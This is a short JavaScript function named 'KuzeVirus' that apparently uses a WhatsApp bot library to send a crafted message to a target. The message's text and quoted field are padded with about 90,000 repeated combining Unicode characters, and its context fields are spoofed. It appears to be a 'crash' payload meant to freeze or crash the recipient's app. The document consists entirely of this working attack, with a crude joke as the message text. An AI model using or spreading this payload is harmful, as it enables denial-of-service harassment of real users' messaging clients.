async function KuzeVirus(target) {
  const message = {
    extendedTextMessage: {
      text: `My dick really hurts :v` + "࣯ꦾ".repeat(90000),
      contextInfo: {
        fromMe: false,
        stanzaId: target,
        participant: target,
        quotedMessage: {
          conversation: "Gpp dah :v" + "ꦾ".repeat(90000),
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING",
        },
      },
      inviteLinkGroupTypeV2: "DEFAULT",
    },
  };

  await sock.relayMessage(target, message, { 
  participant: { jid: target } 
  });
}
